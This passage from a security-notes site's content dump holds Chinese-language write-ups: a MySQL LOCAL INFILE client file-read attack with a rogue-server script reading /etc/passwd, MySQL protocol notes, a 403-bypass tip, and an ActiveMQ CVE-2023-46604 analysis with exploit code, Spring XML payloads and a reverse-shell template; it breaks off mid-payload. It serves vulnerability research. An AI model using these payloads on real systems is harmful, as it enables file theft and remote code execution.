&quot;class java.lang.Short&quot;\n{Class@1050} &quot;boolean&quot; -&gt; {Class@295} &quot;class java.lang.Boolean&quot;\n{Class@244} &quot;interface java.util.Set&quot; -&gt; {Class@107} &quot;class java.util.HashSet&quot;\n{Class@256} &quot;interface java.util.List&quot; -&gt; {Class@246} &quot;class java.util.ArrayList&quot;\n{Class@1051} &quot;double&quot; -&gt; {Class@291} &quot;class java.lang.Double&quot;\n{Class@1052} &quot;byte&quot; -&gt; {Class@290} &quot;class java.lang.Byte&quot;\n里面可以看到 {Class@323} &quot;interface java.util.Map&quot; -&gt; {Class@223} &quot;class java.util.HashMap&quot;，这样原因就找到了。"},"articles/security/mysql/MySQL-Local-File-Read-Arbitrary-File-Read-Vulnerability":{"title":"MySQL Local File Read","links":[],"tags":["mysql","file-read"],"content":"\n来自 LoRexxar@Knownsec 404Team &amp; Dawu@Knownsec 404Team 在 CSS-T 上的分享。\n\n此漏洞的利用方式同样适用于 JDBC MySQL Connecter。\n如果 mysql 客户端在连接服务端时使用了 –enable-local-infile 选项，并执行 LOAD DATA LOCAL INFILE &#039;/etc/passwd&#039; INTO TABLE test FIELDS TERMINATED BY &#039;\\n&#039;; 语句，客户端会读取本地的文件并将其内容发送至服务端。\n因此，如果 mysql 服务器是不受信任的服务器，一个简单的建立连接行为可能会导致对客户端的任意文件读取。\nLOAD DATA INFILE\nLOAD DATA INFILE 是 SQL 注入中常用的语句，用于读取 mysql 服务器上的文件，\nload data infile &quot;/etc/passwd&quot; into table foo FIELDS TERMINATED BY &#039;\\n&#039;;\n但它通常都会遭受 secure_file_priv 权限的限制，利用难度较高。\nmysql&gt; load data infile &quot;/etc/passwd&quot; into table foo FIELDS TERMINATED BY &#039;\\n&#039;;\n \nERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement\n但是该语句有一个关键词，添加 local\nload data local infile &quot;/etc/passwd&quot; into table foo FIELDS TERMINATED BY &#039;\\n&#039;;\n它会读取 client 的文件 /etc/passwd 并填入 server 端表格 foo 中。\nmysql&gt; load data local infile &quot;/etc/passwd&quot; into table foo FIELDS TERMINATED BY &#039;\\n&#039;;\nQuery OK, 7 rows affected (0.01 sec)\nRecords: 7  Deleted: 0  Skipped: 0  Warnings: 0\n\n\n在高版本的 mysql client 和 server 版本中，需要同时在两端开启才可使用。\nERROR 3948 (42000): Loading local data is disabled; this must be enabled on both the client and server sides\n\n开启或关闭 LOAD DATA INFILE\n以下方法来自 8.0 的文档，不一定适合所有版本\n在 mysql 服务端，若需开启或关闭 LOAD DATA INFILE，使用如下参数选项。\n--local-infile=(OFF|ON)\n\n在 mysql 客户端，在编译时是默认关闭 LOAD DATA INFILE 的『ENABLED_LOCAL_INFILE=false』，\n\n如果使用的是 mysql client，则可以通过参数 --local-infile=0 或 --local-infile=1 来关闭或开启 LOAD DATA INFILE。\n利用\nLoRexxar 在他的 文章 中已经提到，可以通过伪造服务端的方式，读取客户端的任意文件。\n假设原本的查询流程为\n客户端：我要把win.ini插入test表中\n服务端：我要你的win.ini内容\n客户端：win.ini的内容如下....\n假设服务端由我们控制，把一个正常的流程篡改成如下\n\n服务端由我们控制，把一个正常的流程篡改成如下\n客户端：我要test表中的数据\n服务端：我要你的win.ini内容\n客户端：win.ini的内容如下???\n\n在 mysql 文档 中也提到，这是可行的。不过这里有一个问题需要验证：是否无论客户端发出怎样的查询请求，只要服务端返回一个特定的响应，客户端都会根据这个响应读取文件并返回。\n\n这里仅关注 JDBC MySQL Connector，下面是一个代码示例，这里直接执行 LOAD DATA INFILE 语句。\npublic class LoadFile {\n    public static void main(String[] args) throws Exception {\n        String URL = &quot;jdbc:mysql://localhost:3306/mysql?useSSL=false&amp;allowUrlInLocalInfile=true&amp;allowLoadLocalInfile=true&quot;;\n        String CLASS_NAME = &quot;com.mysql.cj.jdbc.Driver&quot;;\n        Class.forName(CLASS_NAME);\n \n        Connection connection = DriverManager.getConnection(URL, &quot;root&quot;, &quot;passwd&quot;);\n \n        Statement stmt = connection.createStatement();\n        int rowsAffected = stmt.executeUpdate(&quot;load data local infile \\&quot;/etc/passwd\\&quot; into table foo FIELDS TERMINATED BY &#039;\\\\n&#039;&quot;); // [1]\n        System.out.println(rowsAffected + &quot; row(s) affected.&quot;);\n \n        connection.close();\n    }\n}\n对请求过程进行抓包『注意这里关闭了 SSL』。\n\n首先客户端发送 Greeting 请求，其中携带客户端的信息，如协议版本，验证方法等。其中还包含 salt，应该是用于后续密码验证的\n\n接着，提交认证信息\n\n并继续提交请求，其中都是一些预查询语句，用于获取服务端的参数，为后续请求作准备。\n\nSELECT  @@session.auto_increment_increment AS auto_increment_increment, @@character_set_client AS character_set_client, @@character_set_connection AS character_set_connection, @@character_set_results AS character_set_results, @@character_set_server AS character_set_server, @@collation_server AS collation_server, @@collation_connection AS collation_connection, @@init_connect AS init_connect, @@interactive_timeout AS interactive_timeout, @@license AS license, @@lower_case_table_names AS lower_case_table_names, @@max_allowed_packet AS max_allowed_packet, @@net_write_timeout AS net_write_timeout, @@performance_schema AS performance_schema, @@sql_mode AS sql_mode, @@system_time_zone AS system_time_zone, @@time_zone AS time_zone, @@transaction_isolation AS transaction_isolation, @@wait_timeout AS wait_timeout\nSET character_set_results = NULL\nSET autocommit=1\n\n\n紧接着的为 [1] 中的查询，其中提交的数据只是查询语句，并不包括要读取的文件内容，\n\n读取后的文件另一个请求中进行提交。\n\n这里注意前一个请求的响应『25』类型为 TABULAR，其响应的内容包含了服务端需要客户端读取的文件『』。从某个方面来讲，这印证了前面在 mysql 文档 文档中，提到的，服务端可以单方面指定要读取的文件，后续需要做的，就是实操测试了。\n\n不太清楚 TABULAR 在 mysql 协议中的含义，文档中没有直接提及它，不过从 wireshark 的描述 『第 13 个数据流』 中可以看到，它表示一个语句执行的中间结果『表格的形式』。\n\n\n代码分析\n响应 『25』的触发点在 com.mysql.cj.protocol.a.TextResultsetReader#read\n@Override\npublic Resultset read(int maxRows, boolean streamResults, NativePacketPayload resultPacket, ColumnDefinition metadata,\n\t\tProtocolEntityFactory&lt;Resultset, NativePacketPayload&gt; resultSetFactory) throws IOException {\n \n\tResultset rs = null;\n\t//try {\n\tlong columnCount = resultPacket.readInteger(IntegerDataType.INT_LENENC);\n \n\tif (columnCount &gt; 0) {\n\t\t...\n\t} else {\n\t\t// check for file request\n\t\tif (columnCount == NativePacketPayload.NULL_LENGTH) {\n\t\t\tString charEncoding = this.protocol.getPropertySet().getStringProperty(PropertyKey.characterEncoding).getValue();\n\t\t\tString fileName = resultPacket.readString(StringSelfDataType.STRING_TERM,\n\t\t\t\tthis.protocol.getServerSession().getCharsetSettings().doesPlatformDbCharsetMatches() ? charEncoding : null); // [2]\n\t\t\tresultPacket = this.protocol.sendFileToServer(fileName);\n\t\t}\n在 [2] 读取响应内容中指定的文件名，并通过 NativeProtocol#sendFileToServer 读取文件内容\npublic final NativePacketPayload sendFileToServer(String fileName) {\n\tNativePacketPayload filePacket = (this.loadFileBufRef == null) ? null : this.loadFileBufRef.get();\n \n\tint bigPacketLength = Math.min(this.maxAllowedPacket.getValue() - (NativeConstants.HEADER_LENGTH * 3),\n\t\t\talignPacketSize(this.maxAllowedPacket.getValue() - 16, 4096) - (NativeConstants.HEADER_LENGTH * 3));\n\tint oneMeg = 1024 * 1024;\n\tint smallerPacketSizeAligned = Math.min(oneMeg - (NativeConstants.HEADER_LENGTH * 3),\n\t\t\talignPacketSize(oneMeg - 16, 4096) - (NativeConstants.HEADER_LENGTH * 3));\n\tint packetLength = Math.min(smallerPacketSizeAligned, bigPacketLength);\n \n\t...\n \n\tbyte[] fileBuf = new byte[packetLength];\n\tBufferedInputStream fileIn = null;\n\ttry {\n\t\tfileIn = getFileStream(fileName); // [3]\n其中 [3] 通过 getFileStream 方法获取文件输入流，\nprivate BufferedInputStream getFileStream(String fileName) throws IOException {\n\tRuntimeProperty&lt;Boolean&gt; allowLoadLocalInfile = this.propertySet.getBooleanProperty(PropertyKey.allowLoadLocalInfile);\n\tRuntimeProperty&lt;String&gt; allowLoadLocaInfileInPath = this.propertySet.getStringProperty(PropertyKey.allowLoadLocalInfileInPath);\n\tRuntimeProperty&lt;Boolean&gt; allowUrlInLocalInfile = this.propertySet.getBooleanProperty(PropertyKey.allowUrlInLocalInfile);\n \n\t...\n \n\tif (allowUrlInLocalInfile.getValue()) {\n\t\ttry {\n\t\t\tURL urlFromFileName = new URL(fileName);\n \n\t\t\tif (!urlFromFileName.getProtocol().equalsIgnoreCase(&quot;file&quot;)) {\n\t\t\t\tthrow ExceptionFactory.createException(Messages.getString(&quot;MysqlIO.66&quot;, new Object[] { urlFromFileName.getProtocol() }),\n\t\t\t\t\t\tthis.exceptionInterceptor);\n\t\t\t}\n该方法会判断对应的属性是否设置为 true，比较有意思的一点是，如果设置了 allowUrlInLocalInfile=true，那么还可以使用 file 协议来指定需要读取的文件。\n根据 fnmsd 的 文章，在旧版本的 connector 中可以使用更多的协议 http/https/ftp/file/jar/mailto/netdoc。\n为了验证前面提到的，是否可以无视客户端的查询请求，并让它读取指定文件，再次回顾 com.mysql.cj.protocol.a.TextResultsetReader#read 方法。如果这个方法，是所有查询请求，或者说大部分查询请求数据流都会经过的一个方法，那么服务端就真的可以随意伪造响应内容了。\n在 [4] 打下断点，并重新运行前面的示例，会发现连接成功后的预查询语句的响应也会经过该方法。\npublic Resultset read(int maxRows, boolean streamResults, NativePacketPayload resultPacket, ColumnDefinition metadata,\n\t\tProtocolEntityFactory&lt;Resultset, NativePacketPayload&gt; resultSetFactory) throws IOException {\n \n\tResultset rs = null;\n\t//try {\n\tlong columnCount = resultPacket.readInteger(IntegerDataType.INT_LENENC); // [4]\n \n\tif (columnCount &gt; 0) {\n\t\t// Build a result set with rows.\n\t...\n不过，具体怎么样，还是要实际验证一下。\n伪造服务端\n如果想真的进行利用，需要自行伪造一个 mysql 服务器，Gifts 和 fnmsd 公开过他们的攻击。\n\nGitHub - Gifts/Rogue-MySql-Server: Rogue MySql Server\nGitHub - fnmsd/MySQL_Fake_Server: MySQL Fake Server use to help MySQL Client File Reading and JDBC Client Java Deserialize\n\n不过体验下来都不是很好用，代码太久远了，为了验证前面提到的问题，我偷懒写了个很简单的脚本。\n#!/usr/bin/env python\n# coding: utf8\n \nimport socket\n \nfilelist = (\n    &#039;/etc/passwd&#039;,\n)\n \nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.bind((&#039;localhost&#039;, 3306))\nsock.listen(1)\nprint(&quot;Listening on 3306&quot;)\nwhile True:\n    connection,address = sock.accept()\n    try:\n        connection.settimeout(50)\n        # greeting\n        connection.send(bytes.fromhex(&quot;4a0000000a382e302e3333001a00000008596d5b6704272000ffffff0200ffdf15000000000000000000006d605b15337c2e37022e1637006d7973716c5f6e61746976655f70617373776f726400&quot;))\n \n        buf = connection.recv(1024)\n \n        connection.send(bytes.fromhex(&quot;&quot;))\n        # authentication response\n        connection.send(bytes.fromhex(&quot;0700000200000002000000&quot;))\n \n        # request to load local file\n        buf = connection.recv(4096)\n        connection.send(bytes.fromhex(&quot;0c000001fb2f6574632f706173737764&quot;))\n \n        # receive the response from the client\n        buf = connection.recv(4096)\n        print(buf)\n \n        connection.close()\n    except socket.timeout:\n        print(&quot;Time out&quot;)\n        break\n \nconnection.close()\n运行该脚本，并运行前面的 Java 代码『删掉 executeUpdate 部分的代码』，成功复现。\n\n如果要采用非侵入式的方式，构造一个虚假的服务器，则需要利用中间价对 MySQL 连接进行代理和修改，su18/JDBC-Attack 就是借助了阿里巴巴的 cobar 中间件。\n参考\n\nMysql Client 任意文件读取攻击链拓展\nMySQL Connecter File Read/\n"},"articles/security/mysql/MySQL-Protocol---Basic-Type":{"title":"MySQL Protocol - Basic Type","links":[],"tags":["mysql","protocol"],"content":"Integer Types\n数值类型分为两种，固定长度和可变长度。\nFixedLengthInteger\n固定长度有 6 种，长度分别为 1、2、3、4、6、8 字节。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nTypeLengthint&lt;1&gt;1 byteint&lt;2&gt;2 byteint&lt;3&gt;3 bytesint&lt;4&gt;4 byteint&lt;6&gt;6 byteint&lt;8&gt;8 byte\nLengthEncodedInteger\n可变长度遵循以下规则\n\n[0, 251)：int&lt;1&gt;\n[251, 2^16)：0xFC + int&lt;2&gt;\n[2^16, 2^24)：0xFD + int&lt;3&gt;\n[2^24, 2^64)：0xFE + int&lt;8&gt;\n\nString Types\n一共 5 种\nFixedLengthString\n固定长度字符串，例如 ERR_Package 中的 State 字段，长度固定为 5 个字节。\nNullTerminatedString\n以 00 结尾的字符串。\nVariableLengthString\n可变长度的字符串，字符串的长度由其它字段提供，或在运行时进行计算。\nLengthEncodedStrings\n带长度前缀的字符串，前缀说明后续字符串内容的长度。\nRestOfPacketString\n如果字符串处于 Packet 的结尾，那么它的长度可以通过整个 Packet 的长度减去前面的内容的长度而计算出。"},"articles/security/mysql/MySQL-Protocol---LOCAL-INFILE-Request":{"title":"MySQL Protocol - LOCAL INFILE Request","links":[],"tags":["mysql","protocol","load-infile"],"content":"MySQL 支持读取客户端文件发送至服务端的表格中『通过 Load Local inFile 语句』，此请求属于 Text Protocol 类别下的 COM_QUERY。\nPayload 结构\n请求的 Payload 结构定义如下：\n\nint&lt;1&gt;(command): 0x03 - COM_QUERY\nif CLIENT_QUERY_ATTRIBUTES is set:\n\nint&lt;lenenc&gt;(parameter_count): Number of parameters\nint&lt;lenenc&gt;(parameter_set_count): Number of parameter sets. Currently always 1\nif parameter_count &gt; 0 {\n\nbinary&lt;var&gt;(null_bitmap): NULL bitmap, length = (num_params + 7) / 8\nint&lt;1&gt;(new_params_bind_flag): Always 1. Malformed packet error if not 1\nif new_params_bind_flag is 1, for each parameter:\n\nint&lt;2&gt;(param_type_and_flag): Parameter type (2 bytes). The MSB is reserved for unsigned flag\nstring&lt;lenenc&gt;(parameter name): String\n\n\nend if\nbinary&lt;var&gt;(parameter_values): value of each parameter: Binary Protocol Value\n\n\nend if\n\n\nend if\nstring&lt;EOF&gt;(query): the text of the SQL query to execute\n\n示例\n下面是一个请求包示例『服务端设置了 CLIENT_QUERY_ATTRIBUTES』\n0000   51 00 00 00 03 00 01 6c 6f 61 64 20 64 61 74 61   Q......load data\n0010   20 6c 6f 63 61 6c 20 69 6e 66 69 6c 65 20 22 2f    local infile &quot;/\n0020   65 74 63 2f 70 61 73 73 77 64 22 20 69 6e 74 6f   etc/passwd&quot; into\n0030   20 74 61 62 6c 65 20 66 6f 6f 6c 20 46 49 45 4c    table fool FIEL\n0040   44 53 20 54 45 52 4d 49 4e 41 54 45 44 20 42 59   DS TERMINATED BY\n0050   20 27 5c 6e 27                                     &#039;\\n&#039;\n\n对其进行拆解\n00-02   51 00 00 -&gt; Packet Length: 81\n   03   00 -&gt; Packet Number: 0\n   04   03 -&gt; COM_QUERY: 0x03\n   05   00 -&gt; parameter_count: 0\n   06   01 -&gt; parameter_set_count: 1\n07-50   ... -&gt; query: load data local infile &quot;/etc/passwd&quot; into table fool FIELDS TERMINATED BY &#039;\\n&#039;\n\n下图为 wireshark 的解析结果。\n\n交互过程\n要使用 Load Local inFile 语句，客户端需要设置 CLIENT_LOCAL_FILES 标志。\n\n此标志在发送登陆请求 『第 [7] 个数据包』 时提供。\n\n整个 LOCAL INFILE Request 的交互过程处于 [21-31] 的数据包\n\n下图是通讯过程的流程图\n\n发送 COM_QUERY 请求\n这一部分在前面的示例里已经介绍过了\n返回需要读取的文件名\n0000   0c 00 00 01 fb 2f 65 74 63 2f 70 61 73 73 77 64   ...../etc/passwd\n\n其结构如下\n00-03   0c 00 00 01 -&gt; 请求头，Sequence ID 为 1\n   04   fb -&gt; 固定标志\n05-0F   2f 65 74 63 2f 70 61 73 73 77 64 -&gt; 文件名 /etc/passwd\n\n发送文件内容\n\n发送的请求中，包含请求头 bc 1e 00 02，Sequence ID 为 2，后续为文件内容。\n0000   bc 1e 00 02 23 23 0a 23 20 55 73 65 72 20 44 61   ....##.# User Da\n0010   74 61 62 61 73 65 0a 23 20 0a 23 20 4e 6f 74 65   tabase.# .# Note\n0020   20 74 68 61 74 20 74 68 69 73 20 66 69 6c 65 20    that this file\n0030   ...\n\n发送空的数据包\n其中只有请求头，Sequence ID 为 3\n\n返回 Response OK\n\nOK_Packet 的内容如下，包含修改了的行数，删除的行数已经警告信息。\n0000   38 00 00 04 00 3e 00 02 00 01 00 30 52 65 63 6f   8....&gt;.....0Reco\n0010   72 64 73 3a 20 36 32 20 20 44 65 6c 65 74 65 64   rds: 62  Deleted\n0020   3a 20 30 20 20 53 6b 69 70 70 65 64 3a 20 30 20   : 0  Skipped: 0\n0030   20 57 61 72 6e 69 6e 67 73 3a 20 31                Warnings: 1\n\n参考\n\nMySQL: LOCAL INFILE Request\n"},"articles/security/mysql/MySQL-Protocol---ResultSet":{"title":"MySQL Protocol - ResultSet","links":[],"tags":["mysql","protocol"],"content":"MySQL 的查询结果是一个类似表格的结构\nColumnDefinition41\n如果在 Greeting 包中设置了 CLIENT_PROTOCOL_41 标志则使用此格式传输列定义。\n\n此部分内容包含表格中每一列的定义，例如数据类型，标志，名称等。\nPayload 结构\n请求的 Payload 结构定义如下：\n\n对 MySQL 数据库不熟，这里并不清楚 virtual 和 physical 的具体区别。\n\n\nstring&lt;lenenc&gt;(catalog): The catalog used. Currently always “def”\nstring&lt;lenenc&gt;(schema): schema name\nstring&lt;lenenc&gt;(table): virtual table name\nstring&lt;lenenc&gt;(org_table): physical table name\nstring&lt;lenenc&gt;(name): virtual column name\nstring&lt;lenenc&gt;(org_name): physical column name\nint&lt;lenenc&gt;: length of fixed length fields\t0x0c\nint&lt;2&gt;(character_set): the column character set as defined in Character Set\nint&lt;4&gt;(column_length): maximum length of the field (value)\nint&lt;1&gt;(type): type of the column as defined in enum_field_types\nint&lt;2&gt;(flags): Flags as defined in Column Definition Flags\nint&lt;1&gt;(decimals): max shown decimal digits:\n\n0x00 for integers and static strings\n0x1f for dynamic strings, double, float\n[0x00, 0x51] for decimals\n\n\n\n示例\n下面是一个请求包示例『服务端设置了 CLIENT_PROTOCOL_41』\n0000   34 00 00 01 03 64 65 66 00 0e 73 65 73 73 69 6f   4....def..sessio\n0010   6e 5f 73 74 61 74 75 73 0e 73 65 73 73 69 6f 6e   n_status.session\n0020   5f 73 74 61 74 75 73 01 32 01 32 0c 3f 00 ff ff   _status.2.2.?...\n0030   ff 7f 10 10 00 00                                 ......\n\n对其进行拆解\n00-02   34 00 00 -&gt; Packet Length: 52\n   03   01 -&gt; Sequence ID: 1\n04-07   03 64 65 66 -&gt; Catalog: def\n   08   00 -&gt; Schema: &quot;&quot;\n09-17   0e 73 65 73 73 69 6f 6e 5f 73 74 61 74 75 73: -&gt; Table: session_status\n18-26   0e 73 65 73 73 69 6f 6e 5f 73 74 61 74 75 73: -&gt; Org Table: session_status\n27-28   01 32 -&gt; Name: 1\n29-2A   01 32 -&gt; Org Name: 1\n   2B   0c -&gt; Fixed Value\n2C-2D   3f 00 -&gt; Character: BINARY\n2E-31   ff ff ff 7f -&gt; Column Length: 2147483647\n   32   10 -&gt; Type: MYSQL_TYPE_BIT\n33-34   10 00 -&gt; Flags -&gt; 0000 1000 -&gt; BLOB\n   35   00 -&gt; Decimals: 00\n\nColumnDefinition320\n旧版本协议中的结构，不常用。"},"articles/security/pentesting/New-technique-403-Bypass":{"title":"siri@fu4k1","links":["ReadItLater","Tweet","tags/bypass","tags/BugBounty","tags/bugbountytips"],"tags":["bypass","BugBounty","bugbountytips"],"content":"ReadItLater Tweet\nsiri@fu4k1\n\nNew technique 403 bypass t.co/np8by6lmnw BugBounty bugbountytips t.co/aRrsp1U1e7\n— siri@fu4k1 (@sirifu4k1) February 12, 2023\n\nabbasheybati 提到使用 HTTP 协议可以绕过 403 响应（CDN、服务器阻断）。\n在 Fuzz lyncdiscover.microsoft.com 时，遇到如下情况。请求被拒绝。\n\n而可能的一个原因是，目标会检查 Host 头部。尝试不带任何头部进行访问，并切换至 HTTP 1.0 协议。\n\n\n作者给了两个提示\n\n使用 HTTP 1.0 协议，并且不带任何头部\n当请求中没用 Host 头部时，如果目标的安全策略配置的不完善，则会为该请求自动添加一个 Host 头部，这样在真实的服务器看来这个访问时来自本地的，或者说来自受信任的目标。\n\n此方法还可以绕过 CDN，获取目标真实 IP 地址。使用 HTTP 1.1 访问，返回 Location 进行重定向。\n\n使用 HTTP 1.0 访问，不带头部，响应中给出的是目标 ip 地址。\n\n参考\n\nNew technique 403 bypass lyncdiscover.microsoft.com | by Abbas.heybati | InfoSec Write-ups (infosecwriteups.com)\n"},"articles/security/vulnerabilities/apache-activemq/ActiveMQ-远程代码执行漏洞（CVE-2023-46604）":{"title":"ActiveMQ 远程代码执行漏洞（CVE-2023-46604）","links":[],"tags":["activemq","CVE-2023-46604"],"content":"\n分析版本 5.18.2\n\n补丁分析\n查看补丁内容，在 BaseDataStreamMarshaller#createThrowable 方法中，可以调用指定类的参数类型为 String 的构造方法。\n\n该方法在 v5.18.2 版本中的实现如下\nprivate Throwable createThrowable(String className, String message) {\n\ttry {\n\t\tClass clazz = Class.forName(className, false, BaseDataStreamMarshaller.class.getClassLoader());\n\t\tConstructor constructor = clazz.getConstructor(new Class[] {String.class});\n\t\treturn (Throwable)constructor.newInstance(new Object[] {message});\n\t} catch (Throwable e) {\n\t\treturn new Throwable(className + &quot;: &quot; + message);\n\t}\n}\n从补丁的注释描述，和类名称可以看出 BaseDataStreamMarshaller 与 OpenWire 协议有关，它应该是用于对传输的数据进行 Marshller/UnMarshaller 操作的\n向上追溯在当前类的两个方法中 [1] 和 [2] 都能看到对 createThrowable 的调用\nprotected Throwable tightUnmarsalThrowable(OpenWireFormat wireFormat, DataInput dataIn, BooleanStream bs)\n\tthrows IOException {\n\tif (bs.readBoolean()) {\n\t\tString clazz = tightUnmarshalString(dataIn, bs);\n\t\tString message = tightUnmarshalString(dataIn, bs);\n\t\tThrowable o = createThrowable(clazz, message); // [1]\n\t\t// ...\n}\n \nprotected Throwable looseUnmarsalThrowable(OpenWireFormat wireFormat, DataInput dataIn)\n\tthrows IOException {\n\tif (dataIn.readBoolean()) {\n\t\tString clazz = looseUnmarshalString(dataIn);\n\t\tString message = looseUnmarshalString(dataIn);\n\t\tThrowable o = createThrowable(clazz, message); // [2]\n\t\t// ...\n}\n\n方法名中的 tight 和 loose 对应 OpenWire 中可用的编码格式。\n\n那么只要可以控制传入的 clazz 和 message 的内容，就可调用指定类的参数类型为 String 的构造方法，从而进行利用。\n漏洞利用\nBaseDataStreamMarshaller 只是抽象类，利用的话需要找到它具体的实现类，从补丁的描述看，这不难。\n相关的子类为 ExceptionResponseMarshaller，当然你可以找寻其它能够调用至 tightUnmarsalThrowable 或 looseUnmarsalThrowable 的非抽象子类，例如 ConnectionErrorMarshaller。ExceptionResponseMarshaller#tightUnmarshal 方法如下，可在 [3] 看到对父类方法的调用\npublic void tightUnmarshal(OpenWireFormat wireFormat, Object o, DataInput dataIn, BooleanStream bs) throws IOException {\n\tsuper.tightUnmarshal(wireFormat, o, dataIn, bs);\n \n\tExceptionResponse info = (ExceptionResponse)o;\n\tinfo.setException((java.lang.Throwable) tightUnmarsalThrowable(wireFormat, dataIn, bs)); // [3]\n \n}\n现在的问题是，无论是 ConnectionError 还是 ExceptionResponse 类型的消息，通常都是由服务端，返回给客户端的。\n如果想攻击服务端的话，怎么尽量简单的构造所需的请求数据呢？\n通过查看源码，发现 ActiveMQSession#syncSendPacket 可用于发送 Command『ConnectionError 和 ExceptionResponse，都是 Command 的实现类』，那么可以通过如下代码发送 ExceptionResponse 类型的消息\npublic class Main {\n    public static void main(String[] args) throws Exception {\n        ConnectionFactory connectionFactory = new\n            ActiveMQConnectionFactory(&quot;tcp://localhost:61616&quot;);\n \n        Connection connection = connectionFactory.createConnection(&quot;admin&quot;, &quot;admin&quot;);\n        connection.start();\n        ActiveMQSession session = (ActiveMQSession) connection.createSession();\n        ExceptionResponse exceptionResponse = new ExceptionResponse();\n \n        exceptionResponse.setException(new RuntimeException(xxxx));\n \n        session.syncSendPacket(exceptionResponse);\n \n        connection.close();\n    }\n}\n但是 RuntimeException 的构造方法并无危害，为此需要找一个利用类，常见的就是 ClassPathXmlApplicationContext 远程加载 XML，或是 FileSystemXmlApplicationContext，刚好 activemq 的环境中有这个类。\nExceptionResponse exceptionResponse = new ExceptionResponse();\nexceptionResponse.setException(new ClassPathXmlApplicationContext(&quot;http://127.0.0.1:8000/1.xml&quot;));\n需要注意的时，Spring 中的 ClassPathXmlApplicationContext 没有继承 Throwable 类，所以需要在本地新建一个 ClassPathXmlApplicationContext 类，确保在使用内置接口发送时不会报错\npackage org.springframework.context.support;\n \npublic class ClassPathXmlApplicationContext extends Throwable{\n    private String message;\n \n    public ClassPathXmlApplicationContext(String message) {\n        this.message = message;\n    }\n \n    @Override\n    public String getMessage() {\n        return message;\n    }\n}\n使用的 XML 文档如下\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;\n  &lt;beans xmlns=&quot;www.springframework.org/schema/beans&quot;\n       xmlns:xsi=&quot;www.w3.org/2001/XMLSchema-instance&quot;\n       xsi:schemaLocation=&quot;\n     www.springframework.org/schema/beans\nwww.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;\n    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;\n      &lt;constructor-arg &gt;\n        &lt;list&gt;\n            &lt;value&gt;open&lt;/value&gt;\n            &lt;value&gt;-a&lt;/value&gt;\n            &lt;value&gt;calculator&lt;/value&gt;\n        &lt;/list&gt;\n      &lt;/constructor-arg&gt;\n    &lt;/bean&gt;\n  &lt;/beans&gt;\n已公开的利用\n上述利用方式使用了 ActiveMQ 的接口，其它形式的利用工具可参考 (Metasploit、 Nuclei、 XDB-90299d8578e8 等)\nFileSystemXmlApplicationContext\n除了 ClassPathXmlApplicationContext 外，还有另一个具有相似功能的类 FileSystemXmlApplicationContext。它支持直接使用 SpEL 表达式定义属性造成任意代码执行，下面是一个在 /tmp/poc 写入 Hello Trganda 的例子。\n&lt;beans xmlns=&quot;www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;www.springframework.org/schema/beans www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;\n    &lt;bean id=&quot;vulncheck&quot; class=&quot;java.lang.String&quot;&gt;\n     &lt;property name=&quot;vc&quot; value=&quot;#{&#039;&#039;.getClass().forName(&#039;javax.script.ScriptEngineManager&#039;).newInstance().getEngineByName(&#039;Nashorn&#039;).eval(&#039;var fw = new java.io.FileWriter(&amp;quot;/tmp/poc&amp;quot;); fw.write(&amp;quot;Hello Trganda&amp;quot;); fw.close();&#039;)}&quot;/&gt;\n    &lt;/bean&gt;\n&lt;/beans&gt;\n如何进行反弹 Shell呢，下面的 XML 文件使用 go-exploit 生成的 shell，payload.ReverseShellJJSScript 来自 go-exploit 项目。\nxml := fmt.Sprintf(`&lt;beans\n       xmlns=&quot;www.springframework.org/schema/beans&quot;\n       xmlns:xsi=&quot;www.w3.org/2001/XMLSchema-instance&quot;\n           xsi:schemaLocation=&quot;\n           www.springframework.org/schema/beans www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;\n       &lt;bean id=&quot;vulncheck&quot; class=&quot;java.lang.String&quot;&gt;\n           &lt;property name=&quot;file&quot; value=&quot;#{&#039;&#039;.getClass().forName(&#039;javax.script.ScriptEngineManager&#039;).newInstance().getEngineByName(&#039;Nashorn&#039;).eval(&#039;eval(new java.lang.String(java.util.Base64.decoder.decode(&amp;quot;%s&amp;quot;)));&#039;)}&quot;/&gt;\n       &lt;/bean&gt;\n   &lt;/beans&gt;`, b64.StdEncoding.EncodeToString([]byte(payload.ReverseShellJJSScript(conf.Lhost, conf.Lport, conf.C2Type == c2.SSLShellServer))))\n&lt;beans\n    xmlns=&quot;www.springframework.org/schema/beans&quot;\n    xmlns:xsi=&quot;www.w3.org/2001/XMLSchema-instance&quot;\n         xsi:schemaLocation=&quot;\n         www.springframework.org/schema/beans www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;\n    &lt;bean id=&quot;vulncheck&quot; class=&quot;java.lang.String&quot;&gt;\n     &lt;property name=&quot;file&quot; value=&quot;#{&#039;&#039;.getClass().forName(&#039;javax.script.ScriptEngineManager&#039;).newInstance().getEngineByName(&#039;Nashorn&#039;).eval(&#039;eval(new 